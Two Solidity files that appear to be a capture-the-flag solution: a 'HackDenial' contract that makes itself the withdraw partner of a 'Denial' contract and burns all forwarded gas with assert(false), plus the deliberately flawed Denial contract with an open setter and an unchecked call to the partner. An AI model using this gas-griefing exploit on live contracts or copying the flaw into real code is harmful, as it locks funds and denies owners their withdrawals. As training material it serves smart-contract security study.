// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Denial.sol';

contract HackDenial {
  // Complete with the instance's address
  Denial public originalContract = Denial(payable(0xD80Da85210307030dc3Da7FfF7533dBDE782C2AE)); 
  bool pass = false;

  function hack() public {
    // We're gonna set the partner to be this contract
    originalContract.setWithdrawPartner(address(this));
    // We're gonna call the function withdaw inside the Denial contract
    // We use the call function because if we run out of gas calling the function directly, it's going to revert the transaction
    // Calling the function throw the function call we ensure that the transaction it's not reverted
    address(originalContract).call{gas: 4000}(abi.encodeWithSignature("withdraw()"));
  }

  receive() payable external {
    pass = true;
    /* There're three functions that revert all the state changes
      -revert
      -require
      -assert

      The difference of assert is that it doesn't refund the remaining gas, it depletes the remaining gas.
    */
    assert(false);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}